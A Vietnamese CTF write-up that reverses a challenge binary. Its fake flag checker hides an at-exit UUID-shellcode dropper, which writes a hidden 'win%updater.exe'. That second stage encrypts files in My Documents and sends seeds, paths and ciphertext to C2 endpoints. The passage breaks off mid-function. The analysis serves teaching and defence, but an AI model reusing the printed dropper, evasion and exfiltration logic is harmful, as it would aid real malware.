---
title: KCSC Recruitment 2026
date: 2026-01-01
categories: [Write up]
tags: [CTFs, Reverse]
image: /assets/posts/KCSC_Recruitment_01_2026/kcsc_recruitment_01-2026.jpg
math: true
description: Write up KCSC-Recruitment tháng 1 2026
---

## Flag checker

![image](/assets/posts/KCSC_Recruitment_01_2026/0.png)

### Phase 1

Đây là `main` với luồng check flag đơn giản:

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  Stream *Stream; // eax
  size_t n0x100; // eax
  size_t Size; // kr00_4
  size_t Val; // ebx
  UCHAR *pbOutput_1; // ecx
  _DWORD *p_ct; // edx
  unsigned int n76; // esi
  bool v10; // cf
  BCRYPT_KEY_HANDLE phKey; // [esp+0h] [ebp-320h] BYREF
  BCRYPT_ALG_HANDLE phAlgorithm; // [esp+4h] [ebp-31Ch] BYREF
  ULONG pcbResult; // [esp+8h] [ebp-318h] BYREF
  UCHAR pbOutput[256]; // [esp+Ch] [ebp-314h] BYREF
  UCHAR pbInput[256]; // [esp+10Ch] [ebp-214h] BYREF
  char Buffer[256]; // [esp+20Ch] [ebp-114h] BYREF
  UCHAR pbIV[16]; // [esp+30Ch] [ebp-14h] BYREF

  memset(Buffer, 0, sizeof(Buffer));
  memset(pbInput, 0, sizeof(pbInput));
  memset(pbOutput, 0, sizeof(pbOutput));
  phAlgorithm = 0;
  phKey = 0;
  pcbResult = 0;
  printf("Enter flag: ");
  Stream = _acrt_iob_func(0);
  fgets(Buffer, 256, Stream);
  n0x100 = strcspn(Buffer, "\n");
  if ( n0x100 >= 0x100 )
  {
    sub_DB3F68();
    __debugbreak();
  }
  Buffer[n0x100] = 0;
  Size = strlen(Buffer);
  Val = 16 - (Size & 0xF);
  memcpy(pbInput, Buffer, Size);
  memset(&pbInput[Size], (unsigned __int8)Val, Val);
  *(_OWORD *)pbIV = xmmword_DC10F8;
  BCryptOpenAlgorithmProvider(&phAlgorithm, L"AES", 0, 0);
  BCryptSetProperty(phAlgorithm, L"ChainingMode", (PUCHAR)L"ChainingModeCBC", 0x20u, 0);
  BCryptGenerateSymmetricKey(phAlgorithm, &phKey, 0, 0, &pbSecret, 0x20u, 0);
  BCryptEncrypt(phKey, pbInput, Val + Size, 0, pbIV, 0x10u, pbOutput, 0x100u, &pcbResult, 0);
  if ( pcbResult == 80 )
  {
    pbOutput_1 = pbOutput;
    p_ct = &ct;

    n76 = 76;
    while ( *(_DWORD *)pbOutput_1 == *p_ct )
    {
      pbOutput_1 += 4;
      ++p_ct;
      v10 = n76 < 4;
      n76 -= 4;
      if ( v10 )
      {
        printf("Correct! You got the flag!\n");
        goto LABEL_8;
      }
    }
  }
  printf("Wrong flag lol.\n");
LABEL_8:
  BCryptDestroyKey(phKey);
  BCryptCloseAlgorithmProvider(phAlgorithm, 0);
  return 0;
}
```

```python
from Crypto.Cipher import AES

ct = [
    0x23, 0xBA, 0x53, 0xFD, 0x9B, 0x58, 0x7D, 0x9D, 0x57, 0xF1, 
    0x1D, 0x8B, 0xFF, 0x3A, 0x78, 0x39, 0x64, 0xEF, 0xD4, 0xD1, 
    0x86, 0x64, 0xDA, 0xDE, 0xD9, 0xAE, 0xA0, 0xBA, 0x5E, 0xE6, 
    0xDC, 0xBC, 0x1C, 0x63, 0x19, 0xDA, 0x96, 0x61, 0x5E, 0x4D, 
    0xD6, 0x4A, 0x55, 0x9C, 0xD2, 0x03, 0xA2, 0x96, 0x94, 0xBB, 
    0x5E, 0x43, 0xA2, 0x5A, 0x3D, 0xCD, 0x3B, 0xE5, 0x7D, 0xCB, 
    0x4F, 0x61, 0xD1, 0x45, 0xA8, 0x93, 0xB6, 0x99, 0x2B, 0x49, 
    0x19, 0xD7, 0x04, 0x74, 0x02, 0x40, 0x26, 0x57, 0x33, 0x1C
]
iv = bytes.fromhex('000102030405060708090A0B0C0D0E0F')
key = bytes.fromhex("19564B557F240C6DDE045666BF98C39CB0D800DB7B9BCABBF2BE78828FEF1B73")
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = cipher.decrypt(bytes(ct))
print(pt)
# KCSC{qu4_d4rkc4p_r01_nu`n_na'_na_na_20e3751839b0f1cce44c73358e45a241}
```

Challenge này ở mức độ hard nên luồng trên chỉ là fake.

Phân tích bảng con trỏ hàm trong `initterm` thì tại `sub_DB1000` --> `sub_DB4283` --> `sub_DB4255` --> nhận tham số đầu vào là hàm `Function` và đăng ký con trỏ hàm đó để được tự động gọi khi chương trình kết thúc (khi gọi exit() hoặc khi hàm main return) ==> sau khi kết thúc thực thi luồng fake trong main thì tại `Function` mới là luồng real:

![image](/assets/posts/KCSC_Recruitment_01_2026/1.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/2.png)

Đây là hàm `Function`:

![image](/assets/posts/KCSC_Recruitment_01_2026/3.png)

Cấu trúc rất rõ ràng của kỹ thuật **Shellcode UUID Excution** ([mình có viết 1 bài tìm hiểu ở đây](/posts/Shellcode_via_UUID/)).

Khái quát thì tại `Function` sẽ tạo và cấp phát vùng nhớ Heap để thực thi shellcode, sau đó dùng **UuidFromStringA** chuyển các chuỗi ở trên thành shellcode và gọi **EnumSystemLocalesA** thực thi phần shellcode đã được chuyển đổi tại thanh ghi `ebx` đang trỏ tới:

![image](/assets/posts/KCSC_Recruitment_01_2026/4.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/5.png)

Debug và phân tích thì hàm `sub_1438617` sẽ decode chuỗi byte ngay sau nó. 
Mở rộng phân tích ở chỗ này thì mình sẽ xét 1 ví dụ sau (ảnh trích từ practicalmalwareanalysis book)

![image](/assets/posts/KCSC_Recruitment_01_2026/6.png)

Khác với một file EXE thông thường được hệ điều hành nạp vào một địa chỉ cơ sở (Image Base) cố định (hoặc được Relocation xử lý), Shellcode là một đoạn mã nhị phân được tiêm vào bộ nhớ của một tiến trình khác = nhiều kỹ thuật và hoạt động độc lập.
Ở đây vấn đề đặt ra là shellcode không hề biết trước nó sẽ nằm ở địa chỉ bộ nhớ nào (0x00400000 hay 0x12345678?) và nếu muốn truy cập một chuỗi ký tự (ví dụ: chuỗi "Hello World", ...), nó không thể dùng địa chỉ tuyệt đối.
Quan sát ảnh trên ta thấy shellcode lợi dụng hành vì cơ bản của lệnh **CALL** trong x86 khi CPU thực hiện lệnh `CALL [địa_chỉ]`, nó sẽ tự động **PUSH** địa chỉ của lệnh tiếp theo (Return Address) vào đỉnh **Stack** để sau này khi chạy xong hàm có thể quay về.
Trong hàm được **CALL** thì nó dùng lệnh **POP** lấy giá trị từ đỉnh Stack đưa vào thanh ghi tức là shellcode này thay vì dùng **CALL** để gọi hàm và quay về, nó dùng **CALL** để đẩy địa chỉ của dữ liệu ngay sau nó vào Stack, sau đó dùng **POP** để lấy địa chỉ đó ra và sử dụng ('Hello World!').

Quay trở lại với challenge, nó cũng lợi dụng hành vi kiến trúc của lệnh CALL: đó là tự động PUSH địa chỉ của lệnh tiếp theo (Return Address) vào Stack nhưng khác ở chỗ không dùng POP vào thanh ghi ngay. 
Nó để nguyên địa chỉ trên Stack, đọc nó từ Stack để lấy con trỏ dữ liệu, giải mã dữ liệu đó, và quan trọng nhất là sửa đổi địa chỉ trả về trên Stack để nhảy qua vùng dữ liệu.

![image](/assets/posts/KCSC_Recruitment_01_2026/7.png)

Địa chỉ hiện tại của chuỗi là `0x0143804D`, stack rỗng:

![image](/assets/posts/KCSC_Recruitment_01_2026/8.png)
Ấn F7 để thực hiện lệnh **CALL** và jump vào hàm thì thấy địa chỉ của chuỗi đã được **PUSH** vào đỉnh stack:

![image](/assets/posts/KCSC_Recruitment_01_2026/9.png)

Trong hàm decode này, 3 thanh ghi được push vào stack (3 x 4byte), stack sẽ là:

```
ESP -> Saved EDI

ESP+4 -> Saved ECX

ESP+8 -> Saved EAX

ESP+12 (0x0C) --> địa chỉ chuỗi cần decode
```

![image](/assets/posts/KCSC_Recruitment_01_2026/10.png)

Bước decode sẽ lấy `0x0143804D` từ stack (`mov esi, [esp+0Ch]`), lúc này **esi** đang trỏ tới chuỗi và chạy vòng lặp decode:

```
debug051:01438624 AC                lodsb            ; Đọc byte tại ESI, ESI tự tăng (+1)
debug051:01438625 34 5A             xor     al, 5Ah
debug051:01438627 AA                stosb            ; Ghi kết quả ra buffer tạm (EDI)
...
```

Sau khi decode cho tới khi **al** null thì **ESI** lúc này đã chạy từ đầu tới cuối chuỗi và sang địa chỉ của lệnh tiếp theo và nó lấy giá trị hiện tại của ESI (lúc này đang là `0x01438058` - địa chỉ ngay sau chuỗi dữ liệu) và ghi đè ngược lại vào vị trí Return Address trên Stack.

![image](/assets/posts/KCSC_Recruitment_01_2026/11.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/12.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/13.png)
Tiếp tục pop 3 giá trị tại stack vào 3 thanh ghi thì lúc này đỉnh stack sẽ là địa chỉ của lệnh hợp lệ kế tiếp khi lệnh **RETN** chạy, nó lấy giá trị tại đỉnh Stack (lúc này đã bị sửa thành `0x01438058`) để nạp vào EIP. => CPU nhảy thẳng đến lệnh `mov edx, [ebp-58h]` tiếp theo, bỏ qua hoàn toàn vùng dữ liệu chuỗi ở giữa:

![image](/assets/posts/KCSC_Recruitment_01_2026/14.png)

Sau khi decode thành công chuỗi thì gọi `sub_14386A3` resolve windowAPI:
![image](/assets/posts/KCSC_Recruitment_01_2026/15.png)

Ở đây có thể debug từ từ để xem các chuỗi đó là gì nhưng nếu có quá nhiều chuỗi thì có thể dẫn đến mất thời gian vì thế ta sẽ sử dụng script IDApython để tiện theo dõi:

```python
import idautils

dec_func = {
    0x01438617: 'byte',
    0x0143863A: 'wchar',
    0x0143866D: 'wchar'
}
cnt = 0
for func, m in dec_func.items():
    refs = idautils.CodeRefsTo(func, 0)
    for c in refs:
        if get_wide_byte(c) != 0xE8:
            continue
        insn = ida_ua.insn_t()
        insn_len = 0
        if ida_ua.decode_insn(insn, c):
            insn_len = insn.size
        else:
            insn_len = 5
        start = c + insn_len
        decoded = ''
        ptr = start
        while True:
            if m == 'byte':
                v = get_wide_byte(ptr)
                dv = v ^ 0x5A
                s = 1
            elif m == 'wchar':
                v = get_wide_word(ptr)
                dv = v ^ 0x5A5A
                dv = dv & 0xFF
                s = 2
            if dv == 0:
                break
            if 32 <= dv <= 126:
                decoded += chr(dv)
            else:
                decoded += '.'
            ptr += s
        if decoded:
            cnt += 1
            print(f'Decoded at {hex(c)}: {decoded}')
            set_cmt(c, decoded, 0)
print(cnt)
```

![image](/assets/posts/KCSC_Recruitment_01_2026/16.png)

```
debug051:0143834F 6A 00             push    0
debug051:01438351 6A 00             push    0
debug051:01438353 6A 00             push    0
debug051:01438355 6A 00             push    0
debug051:01438357 8D 85 60 F4 FF FF lea     eax, [ebp-0BA0h]
debug051:0143835D 50                push    eax
debug051:0143835E 6A 00             push    0
debug051:01438360 6A 00             push    0
debug051:01438362 56                push    esi
debug051:01438363 FF 55 E0          call    dword ptr [ebp-20h]             ; GetVolumeInformationA

debug051:01438366 C7 45 84 00 01 00 mov     dword ptr [ebp-7Ch], 100h
debug051:01438366 00
debug051:0143836D 8D 45 84          lea     eax, [ebp-7Ch]
debug051:01438370 50                push    eax
debug051:01438371 8D 85 68 FA FF FF lea     eax, [ebp-598h]
debug051:01438377 50                push    eax
debug051:01438378 FF 55 F0          call    dword ptr [ebp-10h]             ; GetComputerNameA

debug051:0143837B C7 45 84 00 01 00 mov     dword ptr [ebp-7Ch], 100h
debug051:0143837B 00
debug051:01438382 8D 45 84          lea     eax, [ebp-7Ch]
debug051:01438385 50                push    eax
debug051:01438386 8D 85 68 F9 FF FF lea     eax, [ebp-698h]
debug051:0143838C 50                push    eax
debug051:0143838D FF 55 EC          call    dword ptr [ebp-14h]             ; GetUserNameA

debug051:01438390 8D BD 4C FF FF FF lea     edi, [ebp-0B4h]
debug051:01438396 C7 07 1C 01 00 00 mov     dword ptr [edi], 11Ch
debug051:0143839C 57                push    edi
debug051:0143839D FF 55 F4          call    dword ptr [ebp-0Ch]             ; RtlGetVersion

debug051:014383A0 8D 85 70 FF FF FF lea     eax, [ebp-90h]
debug051:014383A6 50                push    eax
debug051:014383A7 FF 55 E8          call    dword ptr [ebp-18h]             ; GetSystemInfo

debug051:014383AA 8D BD 68 F8 FF FF lea     edi, [ebp-798h]
debug051:014383B0 57                push    edi
debug051:014383B1 8D B5 68 F9 FF FF lea     esi, [ebp-698h]
debug051:014383B7 E8 0D 02 00 00    call    append_str
debug051:014383BC B0 40             mov     al, 40h ; '@'
debug051:014383BE AA                stosb
debug051:014383BF 8D B5 68 FA FF FF lea     esi, [ebp-598h]
debug051:014383C5 E8 FF 01 00 00    call    append_str
debug051:014383CA B0 3A             mov     al, 3Ah ; ':'
debug051:014383CC AA                stosb
debug051:014383CD 8D 9D 4C FF FF FF lea     ebx, [ebp-0B4h]
debug051:014383D3 8B 43 04          mov     eax, [ebx+4]
debug051:014383D6 E8 F9 01 00 00    call    get_interger
debug051:014383DB B0 2E             mov     al, 2Eh ; '.'
debug051:014383DD AA                stosb
debug051:014383DE 8B 43 08          mov     eax, [ebx+8]
debug051:014383E1 E8 EE 01 00 00    call    get_interger
debug051:014383E6 B0 3A             mov     al, 3Ah ; ':'
debug051:014383E8 AA                stosb
debug051:014383E9 8D 9D 70 FF FF FF lea     ebx, [ebp-90h]
debug051:014383EF 8B 43 14          mov     eax, [ebx+14h]
debug051:014383F2 E8 DD 01 00 00    call    get_interger
```

Đoạn này thực hiện lấy thông tin máy và ghép lại thành format như sau:

![image](/assets/posts/KCSC_Recruitment_01_2026/17.png)

`User Name@Computer Name:OS Version:Processors`

--> ghép lại info.txt mà challenge cung cấp:
```
[ System Information ]

Computer Name:    DARKCAP
User Name:        pbvm_nu`n_na'_na_na
OS Version:       10.0
Build Number:     19045
Architecture:     x86 (32-bit)
Processors:       2
Page Size:        4096 bytes
Total RAM:        4047 MB
Available RAM:    2319 MB
Memory Load:      42 %
Windows Dir:      C:\Windows
System Dir:       C:\Windows\system32
Process ID:       6176
System Uptime:    0 days 2h 7m 48s
Volume in drive C has no label.
Volume Serial Number is 7AXX-XXXX
```
==>
```
pbvm_nu`n_na'_na_na@DARKCAP:10.0:2
```

Sau đó xor chuỗi đã ghép ở trên với `volumeSerialNumber`:

![image](/assets/posts/KCSC_Recruitment_01_2026/18.png)

Hash SHA256 kết quả xor làm key:

![image](/assets/posts/KCSC_Recruitment_01_2026/19.png)
Gọi hàm `load_blob` để tải data bị mã hóa nằm ở `0x014385C2 + 0x196 = 0x01438758` (khi `call $+5` thì địa chỉ ngay sau nó sẽ được push lên stack là `0x014385C2`) và được **POP** ra gán địa chỉ tại **eax** sau đó **RC4** với key được hash **SHA 256** ở trên:

![image](/assets/posts/KCSC_Recruitment_01_2026/20.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/21.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/22.png)

Cuối cùng set thuộc tính ẩn cho file và ghi vào `C:\\Users\\cyan\\AppData\\Local\\Temp\\` và thực thi:

```
debug051:014384EA 8D 85 68 F6 FF FF lea     eax, [ebp-998h]
debug051:014384F0 50                push    eax
debug051:014384F1 68 04 01 00 00    push    104h
debug051:014384F6 FF 55 AC          call    dword ptr [ebp-54h]             ; GetTempPathA
debug051:014384F9 8D BD 64 F5 FF FF lea     edi, [ebp-0A9Ch]
debug051:014384FF 8D B5 68 F6 FF FF lea     esi, [ebp-998h]
debug051:01438505
debug051:01438505                   loc_1438505:                            ; CODE XREF: debug051:01438509↓j
debug051:01438505 AC                lodsb
debug051:01438506 AA                stosb
debug051:01438507 84 C0             test    al, al
debug051:01438509 75 FA             jnz     short loc_1438505
debug051:0143850B 4F                dec     edi
debug051:0143850C E8 06 01 00 00    call    decode_byte                     ; win%updater.exe
debug051:0143850C                   ; ---------------------------------------------------------------------------
debug051:01438511 2D 33 34 7F 2F 2A…a34TZ db '-34',7Fh,'/*>;.?(t?"?Z'
debug051:01438521                   ; ---------------------------------------------------------------------------
debug051:01438521
debug051:01438521                   loc_1438521:                            ; CODE XREF: debug051:01438525↓j
debug051:01438521 AC                lodsb
debug051:01438522 AA                stosb
debug051:01438523 84 C0             test    al, al
debug051:01438525 75 FA             jnz     short loc_1438521
debug051:01438527 6A 00             push    0
debug051:01438529 68 80 00 00 00    push    80h
debug051:0143852E 6A 02             push    2
debug051:01438530 6A 00             push    0
debug051:01438532 6A 00             push    0
debug051:01438534 68 00 00 00 40    push    40000000h
debug051:01438539 8D 85 64 F5 FF FF lea     eax, [ebp-0A9Ch]
debug051:0143853F 50                push    eax
debug051:01438540 FF 55 C0          call    dword ptr [ebp-40h]             ; CreateFileA
debug051:01438543 83 F8 FF          cmp     eax, 0FFFFFFFFh
debug051:01438546 74 5A             jz      short loc_14385A2
debug051:01438548 50                push    eax
debug051:01438549 6A 00             push    0
debug051:0143854B 8D 4D 84          lea     ecx, [ebp-7Ch]
debug051:0143854E 51                push    ecx
debug051:0143854F 68 00 3E 00 00    push    3E00h
debug051:01438554 E8 64 00 00 00    call    load_blob
debug051:01438559 50                push    eax
debug051:0143855A FF 74 24 10       push    dword ptr [esp+10h]
debug051:0143855E FF 55 BC          call    dword ptr [ebp-44h]             ; WriteFile
debug051:01438561 FF 55 B8          call    dword ptr [ebp-48h]             ; CloseHandle
debug051:01438564 6A 06             push    6
debug051:01438566 8D 85 64 F5 FF FF lea     eax, [ebp-0A9Ch]
debug051:0143856C 50                push    eax
debug051:0143856D FF 55 B4          call    dword ptr [ebp-4Ch]             ; SetFileAttributesA
debug051:01438570 8D BD 30 FE FF FF lea     edi, [ebp-1D0h]
debug051:01438576 C7 07 44 00 00 00 mov     dword ptr [edi], 44h ; 'D'
debug051:0143857C 8D 85 EC FD FF FF lea     eax, [ebp-214h]
debug051:01438582 50                push    eax
debug051:01438583 8D 85 30 FE FF FF lea     eax, [ebp-1D0h]
debug051:01438589 50                push    eax
debug051:0143858A 6A 00             push    0
debug051:0143858C 6A 00             push    0
debug051:0143858E 6A 00             push    0
debug051:01438590 6A 00             push    0
debug051:01438592 6A 00             push    0
debug051:01438594 6A 00             push    0
debug051:01438596 6A 00             push    0
debug051:01438598 8D 85 64 F5 FF FF lea     eax, [ebp-0A9Ch]
debug051:0143859E 50                push    eax
debug051:0143859F FF 55 B0          call    dword ptr [ebp-50h]             ; CreateProcessA
debug051:014385A2
debug051:014385A2                   loc_14385A2:                            ; CODE XREF: debug051:01438472↑j
debug051:014385A2                                                           ; debug051:0143849C↑j ...
debug051:014385A2 FF 75 98          push    dword ptr [ebp-68h]
debug051:014385A5 FF 55 CC          call    dword ptr [ebp-34h]             ; CryptDestroyHash
debug051:014385A8
debug051:014385A8                   loc_14385A8:                            ; CODE XREF: debug051:01438455↑j
debug051:014385A8 6A 00             push    0
debug051:014385AA FF 75 9C          push    dword ptr [ebp-64h]
debug051:014385AD FF 55 C8          call    dword ptr [ebp-38h]             ; CryptReleaseContext
debug051:014385B0
debug051:014385B0                   loc_14385B0:                            ; CODE XREF: debug051:0143843A↑j
debug051:014385B0 6A 00             push    0
debug051:014385B2 FF 55 E4          call    dword ptr [ebp-1Ch]             ; ExitProcess
debug051:014385B5 81 C4 B0 0B 00 00 add     esp, 0BB0h
debug051:014385BB 61                popa
debug051:014385BC C3                retn
debug051:014385BD                   ; ---------------------------------------------------------------------------
```

Tóm lại luồng thực thi thật sự của challenge sẽ là lấy các thông tin máy tính hiện tại của nạn nhân --> ghép lại theo format --> xor với `volumeSerialNumber` ổ đĩa --> **SHA 256** làm key --> giải mã **RC4** --> set thuộc tính ẩn và ghi file vừa giải mã vào folder tmp và thực thi.
Với thông tin `info.txt` được cung cấp thì chỉ cần tìm được `Volume Serial Number is 7AXX-XXXX` là có thể khôi phục lại file `win%updater.exe`. Chỉ 3 byte nên dễ dàng brute:

```python
from Crypto.Cipher import ARC4
from hashlib import sha256
from itertools import product

info = b"pbvm_nu`n_na'_na_na@DARKCAP:10.0:2"
serial = bytes.fromhex('7A')
ct = open('blob.bin', 'rb').read()
char_hex = '0123456789abcdef'
for c in product(char_hex, repeat=6):
    tmp = bytes.fromhex(''.join(c)) + serial
    x = bytes([info[i] ^ tmp[i & 3] for i in range(len(info))])
    key = sha256(x).digest()
    cipher = ARC4.new(key)
    pt = cipher.decrypt(ct)
    if pt[:5] == b'MZ\x90\x00\x03':
        print(tmp.hex())
        open('win_updater.exe', 'wb').write(pt)
        break
# 60cd547a
```

### Phase 2

![image](/assets/posts/KCSC_Recruitment_01_2026/23.png)

Đây là main:

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int p_i_1; // eax
  int i_1; // ecx
  BOOL v6; // edi
  BOOL v7; // edi
  CHAR *pszString_1; // eax
  BYTE *pbBinary_2; // edi
  void *Src_1; // edi
  BYTE *pbBinary_1; // eax
  size_t Size; // eax
  BYTE *pbBinary_4; // eax
  BYTE *pbBinary_3; // edi
  HCRYPTPROV phProv_1; // eax
  CHAR *pszString; // eax
  int n32; // ecx
  BYTE *pbBuffer_2; // eax
  int n16; // ecx
  BYTE *pbBuffer_3; // eax
  void **v21; // ecx
  int p_i_2; // edi
  BYTE *pbBinarya_1; // edi
  void *Block; // [esp+8h] [ebp-188h] BYREF
  void *Src; // [esp+Ch] [ebp-184h]
  BYTE *pbBinarya; // [esp+10h] [ebp-180h] BYREF
  void *v27; // [esp+14h] [ebp-17Ch] BYREF
  int p_i; // [esp+18h] [ebp-178h] BYREF
  int i; // [esp+1Ch] [ebp-174h]
  DWORD pcchString; // [esp+20h] [ebp-170h] BYREF
  DWORD cbBinary; // [esp+24h] [ebp-16Ch] BYREF
  HCRYPTPROV phProv; // [esp+28h] [ebp-168h] BYREF
  _BYTE FileInformation[28]; // [esp+2Ch] [ebp-164h] BYREF
  int v34; // [esp+48h] [ebp-148h]
  unsigned int n0x6400000; // [esp+4Ch] [ebp-144h]
  BYTE iv[16]; // [esp+50h] [ebp-140h] BYREF
  BYTE seed[32]; // [esp+60h] [ebp-130h] BYREF
  CHAR pszPath[268]; // [esp+80h] [ebp-110h] BYREF

  if ( SHGetFolderPathA(0, 5, 0, 0, pszPath) < 0 )
    return 1;
  v27 = 0;
  p_i = 0;
  file_enum(pszPath, &v27, &p_i);
  p_i_1 = p_i;
  if ( p_i )
  {
    i_1 = 0;
    for ( i = 0; i_1 < p_i; i = i_1 )
    {
      Src = (void *)*((_DWORD *)v27 + i_1);
      if ( !GetFileAttributesExA((LPCSTR)Src, GetFileExInfoStandard, FileInformation)
        || v34 > 0
        || v34 >= 0 && n0x6400000 > 0x6400000 )
      {
        goto LABEL_41;
      }
      phProv = 0;
      // ;0xf0000000 -> CRYPT_VERIFYCONTEXT
      if ( !CryptAcquireContextA(&phProv, 0, 0, 0x18u, 0xF0000000) )
        goto LABEL_41;
      v6 = CryptGenRandom(phProv, 0x20u, seed);
      CryptReleaseContext(phProv, 0);
      if ( !v6 )
        goto LABEL_41;
      phProv = 0;
      // ;0xf0000000 -> CRYPT_VERIFYCONTEXT
      if ( !CryptAcquireContextA(&phProv, 0, 0, 0x18u, 0xF0000000) )
        goto LABEL_41;
      v7 = CryptGenRandom(phProv, 0x10u, iv);
      CryptReleaseContext(phProv, 0);
      if ( !v7 )
        goto LABEL_41;
      Block = 0;
      phProv = 0;
      if ( !encrypt_file((char *)Src, &Block, &phProv, seed, iv) )
        goto LABEL_37;
      pcchString = 0;
      if ( !CryptBinaryToStringA(seed, 0x20u, 0x40000001u, 0, &pcchString) )
        goto LABEL_31;
      pszString_1 = (CHAR *)malloc(pcchString);
      pbBinary_2 = (BYTE *)pszString_1;
      if ( !pszString_1 )
        goto LABEL_31;
      if ( CryptBinaryToStringA(seed, 0x20u, 0x40000001u, pszString_1, &pcchString) )
      {
        if ( !sub_461ED0(
                "/208f98eb44b7056e37d57872ee58ca6d660d1c14475acf9e888c07a5402d0bc0",
                pbBinary_2,
                strlen((const char *)pbBinary_2)) )// send seed
        {
          free(pbBinary_2);
LABEL_31:
          free(Block);
          goto LABEL_41;
        }
        free(pbBinary_2);
        Src_1 = Src;
        pbBinarya = 0;
        cbBinary = 0;
        if ( !encrypt_path_file((const char *)Src, &pbBinarya, &cbBinary, (__int128 *)seed) )
        {
          free(Block);
          free(Src_1);
          goto LABEL_42;
        }
        pbBinary_2 = pbBinarya;
        pcchString = 0;
        if ( CryptBinaryToStringA(pbBinarya, cbBinary, 0x40000001u, 0, &pcchString) )
        {
          pbBinary_1 = (BYTE *)malloc(pcchString);
          pbBinarya = pbBinary_1;
          if ( pbBinary_1 )
          {
            if ( CryptBinaryToStringA(pbBinary_2, cbBinary, 0x40000001u, (LPSTR)pbBinary_1, &pcchString) )
            {
              free(pbBinary_2);
              pbBinary_2 = pbBinarya;
              if ( sub_461ED0(
                     "/b28d07a710b993c17dbbc740f34e4a9ad576a7334e87972cc207dcf5ed961736",
                     pbBinarya,
                     strlen((const char *)pbBinarya)) )// send path file
              {
                free(pbBinary_2);
                Size = phProv + 16;
                if ( phProv >= 0xFFFFFFF0 )
                  Size = -1;
                pbBinary_4 = (BYTE *)malloc(Size);
                pbBinary_3 = pbBinary_4;
                if ( pbBinary_4 )
                {
                  memcpy(pbBinary_4, Block, phProv);
                  phProv_1 = phProv;
                  cbBinary = 0;
                  *(_OWORD *)&pbBinary_3[phProv] = *(_OWORD *)iv;
                  pcchString = phProv_1 + 16;
                  if ( CryptBinaryToStringA(pbBinary_3, phProv_1 + 16, 0x40000001u, 0, &cbBinary)
                    && (pszString = (CHAR *)malloc(cbBinary), (pbBinarya = (BYTE *)pszString) != 0) )
                  {
                    if ( !CryptBinaryToStringA(pbBinary_3, pcchString, 0x40000001u, pszString, &cbBinary) )
                    {
                      free(pbBinarya);
                      goto LABEL_36;
                    }
                    free(pbBinary_3);
                    free(Block);
                    pbBinarya_1 = pbBinarya;
                    sub_461ED0(
                      "/a0a8a3456e7906ec55cdd7d2d4148e693555db6dcb5828a30e93c699a66e801a",
                      pbBinarya,
                      strlen((const char *)pbBinarya));// send file+iv
                    free(pbBinarya_1);
                  }
                  else
                  {
LABEL_36:
                    free(pbBinary_3);
                    free(Block);
                  }
LABEL_37:
                  n32 = 32;
                  pbBuffer_2 = seed;
                  do
                  {
                    *pbBuffer_2++ = 0;
                    --n32;
                  }
                  while ( n32 );
                  n16 = 16;
                  pbBuffer_3 = iv;
                  do
                  {
                    *pbBuffer_3++ = 0;
                    --n16;
                  }
                  while ( n16 );
                  goto LABEL_41;
                }
                goto LABEL_31;
              }
            }
            else
            {
              free(pbBinarya);
            }
          }
        }
      }
      free(pbBinary_2);
      free(Block);
LABEL_41:
      free(Src);
LABEL_42:
      p_i_1 = p_i;
      i_1 = i + 1;
    }
    v21 = (void **)v27;
    if ( v27 )
    {
      p_i_2 = 0;
      if ( p_i_1 > 0 )
      {
        do
        {
          free(v21[p_i_2]);
          v21 = (void **)v27;
          ++p_i_2;
        }
        while ( p_i_2 < p_i );
      }
      free(v21);
    }
  }
  return 0;
}
```

`win%updater.exe` này là 1 file PE tương tác với C2.

Để phục vụ cho việc debug thì dùng script này để giả lập server ([tham khảo ở đây](https://github.com/mprovenc/simple-http-client-server) và [đây](https://viblo.asia/p/lap-trinh-socket-bang-python-jvEla084Zkw))

```python
import socket
from base64 import b64decode

host = "192.168.255.131"
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(1)
print(f"Listening on {host}:{port}")
while True:
    try:
        c, addr = s.accept()
        buf = b""
        while True:
            try:
                chunk = c.recv(65536)
                if not chunk:
                    break
                buf += chunk
                while b"\r\n\r\n" in buf:
                    hdr, rest = buf.split(b"\r\n\r\n", 1)
                    first = hdr.split(b"\r\n", 1)[0].decode()
                    clen = 0
                    for line in hdr.split(b"\r\n")[1:]:
                        if line.lower().startswith(b"content-length:"):
                            clen = int(line.split(b":", 1)[1].strip() or b"0")
                            break
                    if len(rest) < clen:
                        break
                    body, buf = rest[:clen], rest[clen:]
                    if first.startswith("POST"):
                        path = first.split()[1]
                        print(f"\nPOST {path}")
                        print("Body:", body.decode())
                        print("Decoded body:", b64decode(body).hex().upper())
                    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
            except Exception as e:
                print("Error:", e)
                break
        c.close()
    except KeyboardInterrupt:
        print("\nServer stopped")
        break
s.close()
```

Đầu tiên duyệt folder `My Documents` (**CSIDL = 5 ~ My Documents**) và lấy thông tin toàn bộ file bên trong:

![image](/assets/posts/KCSC_Recruitment_01_2026/24.png)

Gen random 32 byte **seed**: `B6 F2 39 2C 15 5F 5D C3 9E FC A4 64 F6 FD 47 83 65 5D 56 EB 5F 06 1A 33 3F 54 09 AC 1C 4D B2 57`

![image](/assets/posts/KCSC_Recruitment_01_2026/25.png)

Gen random 16 btye **iv**: `E3 A8 C5 C6 4F 37 0E 70 51 B0 A1 1B 7C AD E6 18`

![image](/assets/posts/KCSC_Recruitment_01_2026/26.png)
Mã hóa file trong `My Documents` (đầu tiên là `desktop.ini`):

<details>
<summary>encrypt_file function</summary>

```cpp
int __fastcall encrypt_file(char *FileName, _DWORD *a2, HCRYPTPROV *p_phProv, BYTE *seed, BYTE *iv)
{
  _BYTE *v5; // edx
  BYTE *v6; // ecx
  char v7; // si
  char v8; // al
  unsigned int v9; // ebx
  char *ct; // esi
  BYTE *Buffer_2; // edi
  int v13; // esi
  BYTE *Buffer; // eax
  size_t n0x1000; // edi
  char *i_3; // eax
  char *pbData; // esi
  HCRYPTPROV v18; // eax
  void (__cdecl *free)(void *); // edx
  int n4096; // ecx
  BYTE *Buffer_3; // eax
  _BYTE *i; // eax
